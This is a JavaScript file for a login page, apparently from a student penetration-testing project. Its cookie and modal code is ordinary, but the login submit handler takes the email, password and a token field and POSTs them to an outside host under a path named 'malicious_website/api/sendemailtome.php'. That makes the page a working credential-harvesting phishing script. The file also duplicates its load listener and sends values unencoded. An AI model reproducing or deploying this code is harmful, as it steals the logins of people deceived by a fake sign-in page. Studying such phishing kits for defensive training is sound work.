// Add an event listener to the window object to execute code when the page has finished loading.
window.addEventListener("load", function () {
  // Get the "rememberedEmail" cookie value.
  const rememberedEmail = getCookie("rememberedEmail");
  // If the cookie value exists, set the value of the email input field to the cookie value.
  if (rememberedEmail) {
    document.getElementById("email").value = rememberedEmail;
    document.getElementById("remember-me").checked = true;
  }

  // Add event listener for the overlay
  const overlay = document.getElementById("overlay");
  overlay.addEventListener("click", function () {
    hideModal();
  });
});

// Create a cookie function
function getCookie(name) {
  const cookieValue = document.cookie.match(
    "(^|;)\\s*" + name + "\\s*=\\s*([^;]+)"
  );
  return cookieValue ? cookieValue.pop() : null;
}
// Set cookie for 30 days
function setCookie(name, value, days) {
  const expires = new Date(
    Date.now() + days * 24 * 60 * 60 * 1000
  ).toUTCString();
  document.cookie = `${name}=${value}; expires=${expires}; path=/`;
}

// set cookie in the past for deletion.
function deleteCookie(name) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
}

// Set the email input value to the value of the rememberedEmail cookie, if it exists
window.addEventListener("load", () => {
  const rememberedEmail = getCookie("rememberedEmail");
  if (rememberedEmail) {
    document.getElementById("email").value = rememberedEmail;
    document.getElementById("remember-me").checked = true;
  }
});

// An event listener to the login-form which is activated by the submit button.
function submitFormLogin(event) {
  event.preventDefault();

  // The two variables are filled with the email value and the password from the form
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Aquire token value from the tokenid in the index.php file and store it in a const token.
  // After storing the token variable, the variable will be transfered to the authentication.php via fetch.
  const token = document.getElementById("token").value;

  // if the either email or password aren't filled than an alert message is sent
  if (email === "" || password === "") {
    alert("Please enter both email and password.");
    return;
  }

  const form = "loginform";

  // Add header that the value is going to be a value form
  // Reference: https://www.geeksforgeeks.org/http-headers-content-type/
  fetch(
    "https://www.studentmind.live/penetration_testing/malicious_website/api/sendemailtome.php",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `form=${form}&email=${email}&password=${password}&token=${token}`,
    }
  )
    .then((response) => response.text())
    .then((data) => {
      if (data === "Email sent") {
        alert();
      } else {
        alert("Something went wrong please try again later.");
      }
    })
    .catch((error) => console.error(error));
}

function showModal() {
  const modal = document.getElementById("popup-change-password");
  const overlay = document.getElementById("overlay");

  modal.style.display = "flex";
  overlay.style.display = "block";
}

function hideModal() {
  const modal = document.getElementById("popup-change-password");
  const overlay = document.getElementById("overlay");

  modal.style.display = "none";
  overlay.style.display = "none";
}

function submitFormChangePassword(event) {
  event.preventDefault();

  // Get the email input value
  const email = document.getElementById("email").value;

  // Get the password input value
  const password = document.getElementById("password2").value;

  fetch("/api/changepassword.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `email=${email}&password=${password}`,
  })
    .then((response) => response.text())
    .then((data) => {
      if (data === "password changed") {
        alert("Password successfully changed.");
        hideModal();
      } else {
        alert("An error occured please try again.");
      }
    })
    .catch((error) => console.error(error));
}
